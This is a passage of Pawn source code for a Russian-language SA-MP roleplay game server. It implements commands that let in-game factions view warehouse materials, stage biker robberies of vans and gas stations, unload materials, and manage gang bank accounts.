   			format(string, 128, " На складе Yakuza %i/100000 материалов {00FF00}Склад открыт", yakuzamats);
			SCM(playerid, COLOR_BLUE, string);
			return true;
		}
	case 10:
		{
			format(string, 128, " На складе SFPD %i/100000 материалов", sfpdmats);
			SCM(playerid, COLOR_BLUE, string);
			return true;
		}
	case 12:
		{
		    if(wareBallasLock)
   			format(string, 128, " На складе Ballas %i/100000 материалов {FF0000}Склад закрыт", ballasmatbi);
   			else
   			format(string, 128, " На складе Ballas %i/100000 материалов {00FF00}Склад открыт", ballasmatbi);
			SCM(playerid, COLOR_BLUE, string);
			return true;
		}
	case 13:
		{
		    if(wareVagosLock)
			format(string, 128, " На складе Vagos %i/100000 материалов {FF0000}Склад закрыт", vagosmatbi);
			else
			format(string, 128, " На складе Vagos %i/100000 материалов {00FF00}Склад открыт", vagosmatbi);
			SCM(playerid, COLOR_BLUE, string);
			return true;
		}
	case 14:
		{
		    if(wareRmLock)
			format(string, 128, " На складе Russian Mafia %i/100000 материалов {FF0000}Склад закрыт", rmmats);
			else
			format(string, 128, " На складе Russian Mafia %i/100000 материалов {00FF00}Склад открыт", rmmats);
			SCM(playerid, COLOR_BLUE, string);
			return true;
		}
	case 15:
		{
		    if(wareGrooveLock)
			format(string, 128, " На складе Grove %i/100000 материалов {FF0000}Склад закрыт", groovmatbi);
			else
			format(string, 128, " На складе Grove %i/100000 материалов {00FF00}Склад открыт", groovmatbi);
			SCM(playerid, COLOR_BLUE, string);
			return true;
		}
	case 17:
		{
		    if(wareAztecLock)
			format(string, 128, " На складе Aztec %i/100000 материалов {FF0000}Склад закрыт", aztekmatbi);
			else
			format(string, 128, " На складе Aztec %i/100000 материалов {00FF00}Склад открыт", aztekmatbi);
			SCM(playerid, COLOR_BLUE, string);
			return true;
		}
	case 18:
		{
		    if(wareRifaLock)
			format(string, 128, " На складе Rifa %i/100000 материалов {FF0000}Склад закрыт", rifamatbi);
			else
			format(string, 128, " На складе Rifa %i/100000 материалов {00FF00}Склад открыт", rifamatbi);
			SCM(playerid, COLOR_BLUE, string);
			return true;
		}
	case 19:
		{
			format(string, 128, " На главном складе: %i материалов", armmatbi);
			SCM(playerid, COLOR_BLUE, string);
			format(string, 128, "На складе LSA: %i материалов", lsamatbi);
			SCM(playerid, 0x66FBA6FF, string);
		}
	case 21:
		{
			format(string, 128, " На складе LVPD %i/100000 материалов", lvpdmats);
			SCM(playerid, COLOR_BLUE, string);
			return true;
		}
	case 24:
		{
			if(wareHAMLock)
			format(string, 128, " На складе Hell's Angels MC %i/100000 материалов {FF0000}Склад закрыт", hamcmatbi);
			else
			format(string, 128, " На складе Hell's Angels MC %i/100000 материалов {00FF00}Склад открыт", hamcmatbi);
			SCM(playerid, COLOR_BLUE, string);
			return true;
		}
	case 26:
		{
		    if(wareWCMLock)
			format(string, 128, " На складе Warlocks MC %i/100000 материалов {FF0000}Склад закрыт", wmcmatbi);
			else
			format(string, 128, " На складе Warlocks MC %i/100000 материалов {00FF00}Склад открыт", wmcmatbi);
			SCM(playerid, COLOR_BLUE, string);
			return true;
		}
	case 29:
		{
		    if(warePMCLock)
			format(string, 128, " На складе Pagans MC %i/100000 материалов {FF0000}Склад закрыт", pmcmatbi);
			else
			format(string, 128, " На складе Pagans MC %i/100000 материалов {00FF00}Склад открыт", pmcmatbi);
			SCM(playerid, COLOR_BLUE, string);
			return true;
		}
	}
	return true;
}
//#4
CMD:empty(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(!IsABiker(playerid)) return SCM(playerid, COLOR_GREY, " Вам не доступна эта функция!");
	if(PTEMP[playerid][pRank] < 3) return SCM(playerid, COLOR_GREY, " Доступно с 3 ранга!");
	new number_of_bikers;
	foreach(i)
	{
        if(ProxDetectorS(10.0, playerid, i) && !IsPlayerInAnyVehicle(i) && PTEMP[i][pMember] == PTEMP[playerid][pMember]) number_of_bikers++;
	}
	if(number_of_bikers < 2) return SCM(playerid, COLOR_GREY, " Ограбить можно только когда вас не менее 2 человек");
	new carRob = -1;
	for(new carid = 0; carid < MAX_VEHICLES; carid++)
	{
        switch(PTEMP[playerid][pMember])
		{
		    case 24:
		    {
		        if(carid == hamccar[10])
		        {
		            RobbingBiker[bikerCar] = carid;
		        }
		    }
			case 26:
			{
			    if(carid == wmccar[10])
		        {
		            RobbingBiker[bikerCar] = carid;
		        }
			}
			case 29:
			{
			    if(carid == pmccar[10])
		        {
		            RobbingBiker[bikerCar] = carid;
		        }
			}
		}
		if(!IsAGunsCar(carid)) continue;
		if(!IsPlayerNearVehicle(playerid, carid, 10.0)) continue;
		if(IsVehicleOccupied(carid) != -1) continue;
		carRob = carid;
	}
	if(RobbingBiker[bikerCar] <= 0) return SCM(playerid, COLOR_GREY, " Рядом нет вашего фургона");
	if(carRob != -1)
	{
		if(RobbingBiker[pickup] != 0) return SCM(playerid, COLOR_GREY, " Сейчас нельзя!");
	 	new Float:x1, Float:y1, Float:z1;
		GetCoordBootVehicle(carRob, x1, y1, z1);
		RobbingBiker[pickup] = CreateDynamicPickup(2969, 1, x1, y1, z1);
		RobbingBiker[robCar] = carRob;
		RobbingBiker[robType] = 1;
		format(string, sizeof(string), "Кол-во груза\n%i", MatHaul[RobbingBiker[robCar]-gunscar[0]][mLoad]);
		Rob3DText = CreateDynamic3DTextLabel(string, 0xEDEA9FAA, x1, y1, z1, 10.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, -1, -1, -1, 100.0);
	}
	else
	{
	    for(new b = 1; b <= TotalBizz; b++)
		{
			if(PlayerToPoint(3, playerid,BizzInfo[b][bEntranceX], BizzInfo[b][bEntranceY], BizzInfo[b][bEntranceZ]))
			{
				if(IsAZapravka(BizzInfo[b][bID]))
				{
				    if(BikerRobbedBizz[BizzInfo[b][bID]]) return SCM(playerid, COLOR_GREY, " Эту заправку уже грабили сегодня!");
				    if((BizzInfo[b][bProducts]-2000) < 0) return SCM(playerid, COLOR_GREY, " На заправке не достаточно продуктов!");
				    if(RobbingBiker[pickup] != 0) return SCM(playerid, COLOR_GREY, " Сейчас нельзя!");
				    BikerRobbedBizz[BizzInfo[b][bID]] = true;
					RobbingBiker[pickup] = CreateDynamicPickup(1650, 1, BizzInfo[b][bEntranceX], BizzInfo[b][bEntranceY], BizzInfo[b][bEntranceZ]);
				    RobbingBiker[robType] = 2;
				    BizzInfo[b][bProducts] -= 2000;
				    RobbingBiker[bresult] = 2000;
				    format(string, sizeof(string), "Кол-во груза\n%i", RobbingBiker[bresult]);
					Rob3DText = CreateDynamic3DTextLabel(string, 0xEDEA9FAA, BizzInfo[b][bEntranceX], BizzInfo[b][bEntranceY], BizzInfo[b][bEntranceZ]+5.0, 10.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, -1, -1, -1, 100.0);
				}
			}
		}
	}
	return true;
}
CMD:bunload(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(!IsABiker(playerid)) return SCM(playerid, COLOR_GREY, " Вам недоступна эта функция!");
 	switch(PTEMP[playerid][pMember])
 	{
 	    case 24:
 	    {
 	        if(GetPlayerVehicleID(playerid) != hamccar[10]) return SCM(playerid, COLOR_GREY, " Вы не в фургоне");
 	        if(!PlayerToPoint(30.0, playerid, 681.5627,-473.9190,16.5363)) return SCM(playerid, COLOR_GREY, " Вы не рядом со своим клубом!");
 	        if(vertmatbilsa[hamccar[10]][0] <= 0 || (hamcmatbi+vertmatbilsa[hamccar[10]][0]) >= 99999) return SCM(playerid, COLOR_GREY, " Ваш склад заполнен, либо фургон пуст!");
 	        hamcmatbi += vertmatbilsa[hamccar[10]][0];
			vertmatbilsa[hamccar[10]][0] = 0;
			format(string, 100, " Склад Hell's Angels MC: %i/100000", hamcmatbi);
			SCM(playerid, -1, string);
			SCM(playerid, COLOR_GREEN, " Материалов: 0/10000");
 	    }
 	    case 26:
 	    {
 	        if(GetPlayerVehicleID(playerid) != wmccar[10]) return SCM(playerid, COLOR_GREY, " Вы не в фургоне");
 	        if(!PlayerToPoint(30.0, playerid, 662.8604,1716.4194,7.1875)) return SCM(playerid, COLOR_GREY, " Вы не рядом со своим клубом!");
 	        if(vertmatbilsa[wmccar[10]][0] <= 0 || (wmcmatbi+vertmatbilsa[wmccar[10]][0]) >= 99999) return SCM(playerid, COLOR_GREY, " Ваш склад заполнен, либо фургон пуст!");
            wmcmatbi += vertmatbilsa[wmccar[10]][0];
			vertmatbilsa[wmccar[10]][0] = 0;
			format(string, 100, " Склад Warlocks MC: %i/100000", wmcmatbi);
			SCM(playerid, -1, string);
			SCM(playerid, COLOR_GREEN, " Материалов: 0/10000");
		 }
 	    case 29:
 	    {
 	        if(GetPlayerVehicleID(playerid) != pmccar[10]) return SCM(playerid, COLOR_GREY, " Вы не в фургоне");
 	    	if(!PlayerToPoint(30.0, playerid, -2105.8921,-2480.8372,30.6250)) return SCM(playerid, COLOR_GREY, " Вы не рядом со своим клубом!");
 	    	if(vertmatbilsa[pmccar[10]][0] <= 0 || (pmcmatbi+vertmatbilsa[pmccar[10]][0]) >= 99999) return SCM(playerid, COLOR_GREY, " Ваш склад заполнен, либо фургон пуст!");
            pmcmatbi += vertmatbilsa[pmccar[10]][0];
			vertmatbilsa[pmccar[10]][0] = 0;
			format(string, 100, " Склад Pagans MC: %i/100000", pmcmatbi);
			SCM(playerid, -1, string);
			SCM(playerid, COLOR_GREEN, " Материалов: 0/10000");
		 }
  	}
	return true;
}
CMD:unloading(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	new tmpcar = GetPlayerVehicleID(playerid);
	if(GetVehicleModel(GetPlayerVehicleID(playerid)) != 482) return SCM(playerid,COLOR_GREY, " Вы не в фургоне!");
	if(PTEMP[playerid][pMember] == 12 && PTEMP[playerid][pRank] >= 3)
	{
		if(Furi[tmpcar-matsfura[0]][gBallas] <= 0) return SCM(playerid,COLOR_GREY, " Не достаточно материалов, для разгрузки");
		if(PlayerToPoint(6.0,playerid,1454.3406,758.1638,11.0234))
		{
			lcnmats += Furi[tmpcar-matsfura[0]][gBallas];
			Furi[tmpcar-matsfura[0]][gBallas] = 0;
			format(YCMDstr, sizeof(YCMDstr), " Материалы разргружены! В фургоне: %i/10000 материалов", Furi[tmpcar-matsfura[0]][gBallas]);
			SCM(playerid, TEAM_GROVE_COLOR, YCMDstr);
			if(lcnmats > 100000) lcnmats = 100000;
			format(YCMDstr, sizeof(YCMDstr), " Склад мафии LCN: %i/100000", lcnmats);
			SCM(playerid, -1, YCMDstr);
			return true;
		}
		else if(PlayerToPoint(6.0,playerid,967.3965,1684.1112,8.8516))
		{
			rmmats += Furi[tmpcar-matsfura[0]][gBallas];
			Furi[tmpcar-matsfura[0]][gBallas] = 0;
			format(YCMDstr, sizeof(YCMDstr), " Материалы разргружены! В фургоне: %i/10000 материалов", Furi[tmpcar-matsfura[0]][gBallas]);
			SCM(playerid, TEAM_GROVE_COLOR, YCMDstr);
			if(rmmats > 100000) rmmats = 100000;
			format(YCMDstr, sizeof(YCMDstr), " Склад Русской мафии: %i/100000", rmmats);
			SCM(playerid, -1, YCMDstr);
			return true;
		}
		else if(PlayerToPoint(6.0,playerid,1460.3116,2763.8110,10.8203))
		{
			yakuzamats += Furi[tmpcar-matsfura[0]][gBallas];
			Furi[tmpcar-matsfura[0]][gBallas] = 0;
			format(YCMDstr, sizeof(YCMDstr), " Материалы разргружены! В фургоне: %i/10000 материалов",Furi[tmpcar-matsfura[0]][gBallas]);
			SCM(playerid, TEAM_GROVE_COLOR, YCMDstr);
			if(yakuzamats > 100000) yakuzamats = 100000;
			format(YCMDstr, sizeof(YCMDstr), " Склад Якудза: %i/100000", yakuzamats);
			SCM(playerid, -1, YCMDstr);
			return true;
		}
		if(!IsATerra (playerid)) return SCM(playerid, COLOR_GRAD1, " Вы не на своей базе");
		if(ballasmatbi > 100000) return  SCM(playerid,COLOR_GREY, " Склад заполнен");
		ballasmatbi += Furi[tmpcar-matsfura[0]][gBallas];
		Furi[tmpcar-matsfura[0]][gBallas] = 0;
		SCM(playerid,COLOR_GREEN, " Материалы разгружены");
        format(string, 128, " Материалы: %i/%i", Furi[0][gBallas], maxMats[gBallas]);
		SCM(playerid, TEAM_GROVE_COLOR, string);
	}
	else if(PTEMP[playerid][pMember] == 13 && PTEMP[playerid][pRank] >= 3)
	{
		if(Furi[tmpcar-matsfuravagos[0]][gVagos] <= 0) return SCM(playerid,COLOR_GREY, " Не достаточно материалов, для разгрузки");
		if(PlayerToPoint(6.0,playerid,1454.3406,758.1638,11.0234))
		{
			lcnmats += Furi[tmpcar-matsfuravagos[0]][gVagos];
			Furi[tmpcar-matsfuravagos[0]][gVagos] = 0;
			format(YCMDstr, sizeof(YCMDstr), " Материалы разргружены! В фургоне: %i/10000 материалов", Furi[tmpcar-matsfuravagos[0]][gVagos]);
			SCM(playerid, TEAM_GROVE_COLOR, YCMDstr);
			format(YCMDstr, sizeof(YCMDstr), " Склад мафии LCN: %i/100000", lcnmats);
			SCM(playerid, -1, YCMDstr);
			return true;
		}
		else if(PlayerToPoint(6.0,playerid,967.3965,1684.1112,8.8516))
		{
			rmmats += Furi[tmpcar-matsfuravagos[0]][gVagos];
			Furi[tmpcar-matsfuravagos[0]][gVagos] = 0;
			format(YCMDstr, sizeof(YCMDstr), " Материалы разргружены! В фургоне: %i/10000 материалов", Furi[tmpcar-matsfuravagos[0]][gVagos]);
			SCM(playerid, TEAM_GROVE_COLOR, YCMDstr);
			format(YCMDstr, sizeof(YCMDstr), " Склад Русской мафии: %i/100000", rmmats);
			SCM(playerid, -1, YCMDstr);
			return true;
		}
		else if(PlayerToPoint(6.0,playerid,1460.3116,2763.8110,10.8203))
		{
			yakuzamats += Furi[tmpcar-matsfuravagos[0]][gVagos];
			Furi[tmpcar-matsfuravagos[0]][gVagos] = 0;
			format(YCMDstr, sizeof(YCMDstr), " Материалы разргружены! В фургоне: %i/10000 материалов", Furi[tmpcar-matsfuravagos[0]][gVagos]);
			SCM(playerid, TEAM_GROVE_COLOR, YCMDstr);
			format(YCMDstr, sizeof(YCMDstr), " Склад Якудза: %i/100000", yakuzamats);
			SCM(playerid, -1, YCMDstr);
			return true;
		}
		if(!IsATerra (playerid)) return SCM(playerid, COLOR_GRAD1, " Вы не на своей базе");
		if(vagosmatbi > 100000) return SCM(playerid,COLOR_GREY, " Склад заполнен");
		vagosmatbi += Furi[tmpcar-matsfuravagos[0]][gVagos];
		Furi[tmpcar-matsfuravagos[0]][gVagos] = 0;
		SCM(playerid,COLOR_GREEN, " Материалы разгружены");
		format(string, 128, " Материалы: %i/%i", Furi[tmpcar-matsfuravagos[0]][gVagos], maxMats[gVagos]);
		SCM(playerid, TEAM_GROVE_COLOR, string);
	}
	else if(PTEMP[playerid][pMember] == 15 && PTEMP[playerid][pRank] >= 3)
	{
		if(Furi[tmpcar-matsfuragrove[0]][gGrove] <= 0) return   SCM(playerid,COLOR_GREY, " Не достаточно материалов, для разгрузки");
		if(PlayerToPoint(6.0,playerid,1454.3406,758.1638,11.0234))
		{
			lcnmats +=  Furi[tmpcar-matsfuragrove[0]][gGrove];
			Furi[tmpcar-matsfuragrove[0]][gGrove] = 0;
			format(YCMDstr, sizeof(YCMDstr), " Материалы разргружены! В фургоне: %i/10000 материалов", Furi[tmpcar-matsfuragrove[0]][gGrove]);
			SCM(playerid, TEAM_GROVE_COLOR, YCMDstr);
			format(YCMDstr, sizeof(YCMDstr), " Склад мафии LCN: %i/100000", lcnmats);
			SCM(playerid, -1, YCMDstr);
			return true;
		}
		else if(PlayerToPoint(6.0,playerid,967.3965,1684.1112,8.8516))
		{
			rmmats += Furi[tmpcar-matsfuragrove[0]][gGrove];
			Furi[tmpcar-matsfuragrove[0]][gGrove] = 0;
			format(YCMDstr, sizeof(YCMDstr), " Материалы разргружены! В фургоне: %i/10000 материалов", Furi[tmpcar-matsfuragrove[0]][gGrove]);
			SCM(playerid, TEAM_GROVE_COLOR, YCMDstr);
			format(YCMDstr, sizeof(YCMDstr), " Склад Русской мафии: %i/100000", rmmats);
			SCM(playerid, -1, YCMDstr);
			return true;
		}
		else if(PlayerToPoint(6.0,playerid,1460.3116,2763.8110,10.8203))
		{
			yakuzamats += Furi[tmpcar-matsfuragrove[0]][gGrove];
			Furi[tmpcar-matsfuragrove[0]][gGrove] = 0;
			format(YCMDstr, sizeof(YCMDstr), " Материалы разргружены! В фургоне: %i/10000 материалов", Furi[tmpcar-matsfuragrove[0]][gGrove]);
			SCM(playerid, TEAM_GROVE_COLOR, YCMDstr);
			format(YCMDstr, sizeof(YCMDstr), " Склад Якудза: %i/100000", yakuzamats);
			SCM(playerid, -1, YCMDstr);
			return true;
		}
		if(!IsATerra (playerid)) return SCM(playerid, COLOR_GRAD1, " Вы не на своей базе");
		if(groovmatbi > 100000) return   SCM(playerid,COLOR_GREY, " Склад заполнен");
		groovmatbi += Furi[tmpcar-matsfuragrove[0]][gGrove];
		Furi[tmpcar-matsfuragrove[0]][gGrove] = 0;
		SCM(playerid,COLOR_GREEN, " Материалы разгружены");
		format(string, 128, " Материалы: %i/%i", Furi[0][gGrove], maxMats[gGrove]);
		SCM(playerid, TEAM_GROVE_COLOR, string);
	}
	else if(PTEMP[playerid][pMember] == 17 && PTEMP[playerid][pRank] >= 3)
	{
		if(Furi[tmpcar-matsfuraactek[0]][gAztek] <= 0) return  SCM(playerid,COLOR_GREY, " Не достаточно материалов, для разгрузки");
		if(PlayerToPoint(6.0,playerid,1454.3406,758.1638,11.0234))
		{
			lcnmats +=  Furi[tmpcar-matsfuraactek[0]][gAztek];
			Furi[tmpcar-matsfuraactek[0]][gAztek] = 0;
			format(YCMDstr, sizeof(YCMDstr), " Материалы разргружены! В фургоне: %i/10000 материалов", Furi[tmpcar-matsfuraactek[0]][gAztek]);
			SCM(playerid, TEAM_GROVE_COLOR, YCMDstr);
			format(YCMDstr, sizeof(YCMDstr), " Склад мафии LCN: %i/100000", lcnmats);
			SCM(playerid, -1, YCMDstr);
			return true;
		}
		else if(PlayerToPoint(6.0,playerid,967.3965,1684.1112,8.8516))
		{
			rmmats += Furi[tmpcar-matsfuraactek[0]][gAztek];
			Furi[tmpcar-matsfuraactek[0]][gAztek] = 0;
			format(YCMDstr, sizeof(YCMDstr), " Материалы разргружены! В фургоне: %i/10000 материалов", Furi[tmpcar-matsfuraactek[0]][gAztek]);
			SCM(playerid, TEAM_GROVE_COLOR, YCMDstr);
			format(YCMDstr, sizeof(YCMDstr), " Склад Русской мафии: %i/100000", rmmats);
			SCM(playerid, -1, YCMDstr);
			return true;
		}
		else if(PlayerToPoint(6.0,playerid,1460.3116,2763.8110,10.8203))
		{
			yakuzamats += Furi[tmpcar-matsfuraactek[0]][gAztek];
			Furi[tmpcar-matsfuraactek[0]][gAztek] = 0;
			format(YCMDstr, sizeof(YCMDstr), " Материалы разргружены! В фургоне: %i/10000 материалов", Furi[tmpcar-matsfuraactek[0]][gAztek]);
			SCM(playerid, TEAM_GROVE_COLOR, YCMDstr);
			format(YCMDstr, sizeof(YCMDstr), " Склад Якудза: %i/100000", yakuzamats);
			SCM(playerid, -1, YCMDstr);
			return true;
		}
		if(!IsATerra (playerid)) return SCM(playerid, COLOR_GRAD1, " Вы не на своей базе");
		if(aztekmatbi > 100000) return SCM(playerid,COLOR_GREY, " Склад заполнен");
		aztekmatbi += Furi[tmpcar-matsfuraactek[0]][gAztek];
		Furi[tmpcar-matsfuraactek[0]][gAztek] = 0;
		SCM(playerid,COLOR_GREEN, " Материалы разгружены");
		format(string, 128, " Материалы: %i/%i", Furi[0][gAztek], maxMats[gAztek]);
		SCM(playerid, TEAM_GROVE_COLOR, string);
	}
	else if(PTEMP[playerid][pMember] == 18 && PTEMP[playerid][pRank] >= 3)
	{
		if(Furi[tmpcar-matsfurarifa[0]][gRifa] <= 0) return SCM(playerid,COLOR_GREY, " Не достаточно материалов, для разгрузки");
		if(PlayerToPoint(6.0,playerid,1454.3406,758.1638,11.0234))
		{
			lcnmats +=  Furi[tmpcar-matsfurarifa[0]][gRifa];
			Furi[tmpcar-matsfurarifa[0]][gRifa] = 0;
			format(YCMDstr, sizeof(YCMDstr), " Материалы разргружены! В фургоне: %i/10000 материалов", Furi[tmpcar-matsfurarifa[0]][gRifa]);
			SCM(playerid, TEAM_GROVE_COLOR, YCMDstr);
			format(YCMDstr, sizeof(YCMDstr), " Склад мафии LCN: %i/100000", lcnmats);
			SCM(playerid, -1, YCMDstr);
			return true;
		}
		else if(PlayerToPoint(6.0,playerid,967.3965,1684.1112,8.8516))
		{
			rmmats += Furi[tmpcar-matsfurarifa[0]][gRifa];
			Furi[tmpcar-matsfurarifa[0]][gRifa] = 0;
			format(YCMDstr, sizeof(YCMDstr), " Материалы разргружены! В фургоне: %i/10000 материалов", Furi[tmpcar-matsfurarifa[0]][gRifa]);
			SCM(playerid, TEAM_GROVE_COLOR, YCMDstr);
			format(YCMDstr, sizeof(YCMDstr), " Склад Русской мафии: %i/100000", rmmats);
			SCM(playerid, -1, YCMDstr);
			return true;
		}
		else if(PlayerToPoint(6.0,playerid,1460.3116,2763.8110,10.8203))
		{
			yakuzamats += Furi[tmpcar-matsfurarifa[0]][gRifa];
			Furi[tmpcar-matsfurarifa[0]][gRifa] = 0;
			format(YCMDstr, sizeof(YCMDstr), " Материалы разргружены! В фургоне: %i/10000 материалов", Furi[tmpcar-matsfurarifa[0]][gRifa]);
			SCM(playerid, TEAM_GROVE_COLOR, YCMDstr);
			format(YCMDstr, sizeof(YCMDstr), " Склад Якудза: %i/100000", yakuzamats);
			SCM(playerid, -1,YCMDstr);
			return true;
		}
		if(!IsATerra (playerid)) return SCM(playerid, COLOR_GRAD1, " Вы не на своей базе");
		if(rifamatbi > 100000) return   SCM(playerid,COLOR_GREY, " Склад заполнен");
		rifamatbi += Furi[tmpcar-matsfurarifa[0]][gRifa];
		Furi[tmpcar-matsfurarifa[0]][gRifa] = 0;
		SCM(playerid,COLOR_GREEN, " Материалы разгружены");
		format(string, 128, " Материалы: %i/%i", Furi[0][gRifa], maxMats[gRifa]);
		SCM(playerid, TEAM_GROVE_COLOR, string);
	}
	return true;
}
CMD:gbank(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	switch(PTEMP[playerid][pMember])
	{
	case 15:
		{
			format(YCMDstr, sizeof(YCMDstr), " В банке Grove: %i вирт", FracBank[0][fGrove]);
			SCM(playerid, 0x6495EDFF, YCMDstr);
			return true;
		}
	case 12:
		{
			format(YCMDstr, sizeof(YCMDstr), " В банке Ballas: %i вирт", FracBank[0][fBallas]);
			SCM(playerid, 0x6495EDFF, YCMDstr);
			return true;
		}
	case 13:
		{
			format(YCMDstr, sizeof(YCMDstr), " В банке Vagos: %i вирт", FracBank[0][fVagos]);
			SCM(playerid, 0x6495EDFF, YCMDstr);
			return true;
		}
	case 17:
		{
			format(YCMDstr, sizeof(YCMDstr), " В банке Aztec: %i вирт", FracBank[0][fAztek]);
			SCM(playerid, 0x6495EDFF, YCMDstr);
			return true;
		}
	case 18:
		{
			format(YCMDstr, sizeof(YCMDstr), " В банке Rifa: %i вирт", FracBank[0][fRifa]);
			SCM(playerid, 0x6495EDFF, YCMDstr);
			return true;
		}
	}
	return true;
}
CMD:gbankwithdraw(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pLeader] == 15 || PTEMP[playerid][pLeader] == 12 || PTEMP[playerid][pLeader] == 13 || PTEMP[playerid][pLeader] == 17 || PTEMP[playerid][pLeader] == 18)
	if(sscanf(params, "d", params[0])) return SCM(playerid, -1, " Введите: /gbankwithdraw [количество]");
	if(PTEMP[playerid][pMember] == 12 && PTEMP[playerid][pRank] == 10)
	{
		if(FracBank[0][fBallas] == 0) { SCM(playerid, COLOR_GREY, " В банке банды Ballas нет денег"); return true; }
		if(FracBank[0][fBallas] < params[0]) { SCM(playerid, COLOR_GREY, " В банке банды Ballas нет столько денег"); return true; }
		if(params[0] > 100000000 || params[0] < 1) { SCM(playerid, COLOR_GREY, " Неправильный количество денег!"); return true; }
		if((limitgang[Ballas]+params[0]) > 100000) return SCM(playerid, COLOR_GREY, " Вы не можете снять больше 100 000 в день!");
		FracBank[0][fBallas] -= params[0];
		PTEMP[playerid][pCash] += params[0];
		format(YCMDstr, sizeof(YCMDstr), " Вы сняли с банка банды Ballas: %i вирт", params[0]);
		SCM(playerid, 0x6495EDFF, YCMDstr);
		limitgang[Ballas] += params[0];
		printf("Игрок %s снял со счёта Ballas %i вирт", PTEMP[playerid][pName], params[0]);
	}
	else if(PTEMP[playerid][pMember] == 13 && PTEMP[playerid][pRank] == 10)
	{
		if(FracBank[0][fVagos] == 0) { SCM(playerid, COLOR_GREY, " В банке банды Vagos нет денег"); return true; }
		if(FracBank[0][fVagos] < params[0]) { SCM(playerid, COLOR_GREY, " В банке банды Vagos нет столько денег"); return true; }
		if(params[0] > 100000000 || params[0] < 1) { SCM(playerid, COLOR_GREY, " Неправильный количество денег!"); return true; }
		if((limitgang[Vagos]+params[0]) > 100000) return SCM(playerid, COLOR_GREY, " Вы не можете снять больше 100 000 в день!");
		FracBank[0][fVagos] -= params[0];
		PTEMP[playerid][pCash] +=params[0];
		format(YCMDstr, sizeof(YCMDstr), " Вы сняли с банка банды Vagos: %i вирт", params[0]);
		SCM(playerid, 0x6495EDFF, YCMDstr);
		limitgang[Vagos] += params[0];
		printf("Игрок %s снял со счёта Vagos %i вирт", PTEMP[playerid][pName], params[0]);
	}
	else if(PTEMP[playerid][pMember] == 15 && PTEMP[playerid][pRank] == 10)
	{
		if(FracBank[0][fGrove] == 0) { SCM(playerid, COLOR_GREY, " В банке банды Grove нет денег"); return true; }
		if(FracBank[0][fGrove] < params[0]) { SCM(playerid, COLOR_GREY, " В банке банды Grove нет столько денег"); return true; }
		if(params[0] > 100000000 || params[0] < 1) { SCM(playerid, COLOR_GREY, " Неправильный количество денег!"); return true; }
		if((limitgang[Grove]+params[0]) > 100000) return SCM(playerid, COLOR_GREY, " Вы не можете снять больше 100 000 в день!");
		FracBank[0][fGrove] -= params[0];
		PTEMP[playerid][pCash] +=params[0];
		format(YCMDstr, sizeof(YCMDstr), " Вы сняли с банка банды Grove: %i вирт", params[0]);
		SCM(playerid, 0x6495EDFF, YCMDstr);
		limitgang[Grove] += params[0];
		printf("Игрок %s снял со счёта Grove %i вирт", PTEMP[playerid][pName], params[0]);
	}
	else if(PTEMP[playerid][pMember] == 17 && PTEMP[playerid][pRank] == 10)
	{
		if(FracBank[0][fAztek] == 0) { SCM(playerid, COLOR_GREY, "В банке банды Aztec нет денег"); return true; }
		if(FracBank[0][fAztek] < params[0]) { SCM(playerid, COLOR_GREY, "В банке банды Aztec нет столько денег"); return true; }
		if(params[0] > 100000000 || params[0] < 1) { SCM(playerid, COLOR_GREY, " Неправильный количество денег!"); return true; }
		FracBank[0][fAztek] -= params[0];
		PTEMP[playerid][pCash] +=params[0];
		format(YCMDstr, sizeof(YCMDstr), " Вы сняли с банка банды Aztec: %i вирт", params[0]);
		SCM(playerid, 0x6495EDFF, YCMDstr);
		limitgang[Aztec] += params[0];
		printf("Игрок %s снял со счёта Aztec %i вирт", PTEMP[playerid][pName], params[0]);
	}
	else if(PTEMP[playerid][pMember] == 18 && PTEMP[playerid][pRank] == 10)
	{
		if(FracBank[0][fRifa] == 0) { SCM(playerid, COLOR_GREY, " В банке банды Rifa нет денег"); return true; }
		if(FracBank[0][fRifa] < params[0]) { SCM(playerid, COLOR_GREY, " В банке банды Rifa нет столько денег"); return true; }
		if(params[0] > 100000000 || params[0] < 1) { SCM(playerid, COLOR_GREY, " Неправильный количество денег!"); return true; }
		if((limitgang[Rifa]+params[0]) > 100000) return SCM(playerid, COLOR_GREY, " Вы не можете снять больше 100 000 в день!");
		FracBank[0][fRifa] -= params[0];
		PTEMP[playerid][pCash] +=params[0];
		format(YCMDstr, sizeof(YCMDstr), " Вы сняли с банка банды Rifa: %i вирт", params[0]);
		SCM(playerid, 0x6495EDFF, YCMDstr);
		limitgang[Rifa] += params[0];
		printf("Игрок %s снял со счёта Rifa %i вирт", PTEMP[playerid][pName], params[0]);
	}
	return true;
}
CMD:gbankput(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pMember] == 15 || PTEMP[playerid][pMember] == 12 || PTEMP[playerid][pMember] == 13 || PTEMP[playerid][pMember] == 17 || PTEMP[playerid][pMember] == 18)
	if(sscanf(params, "d", params[0])) return SCM(playerid, -1, " Введите: /gbankput [количество]");
	if(params[0] < 1) { SCM(playerid, COLOR_GREY, " Неправильное количество денег!"); return true; }
	switch(PTEMP[playerid][pMember])
	{
	case 15:
		{
			if(PTEMP[playerid][pCash] < params[0]) { SCM(playerid, COLOR_GREY, " У вас нет столько денег!"); return true; }
			FracBank[0][fGrove] += params[0];
			PTEMP[playerid][pCash] -= params[0];
			format(YCMDstr, sizeof(YCMDstr), " Вы положили в банк Grove: %i вирт", params[0]);
			SCM(playerid, 0x6495EDFF, YCMDstr);
			printf("Игрок %s положил на счёт Grove %i вирт", PTEMP[playerid][pName], params[0]);
		}
	case 12:
		{
			if(PTEMP[playerid][pCash] < params[0]) { SCM(playerid, COLOR_GREY, " У вас нет столько денег!"); return true; }
			FracBank[0][fBallas] += params[0];
			PTEMP[playerid][pCash] -= params[0];
			format(YCMDstr, sizeof(YCMDstr), " Вы положили в банк Ballas: %i вирт", params[0]);
			SCM(playerid, 0x6495EDFF, YCMDstr);
			printf("Игрок %s положил на счёт Ballas %i вирт", PTEMP[playerid][pName], params[0]);
		}
	case 13:
		{
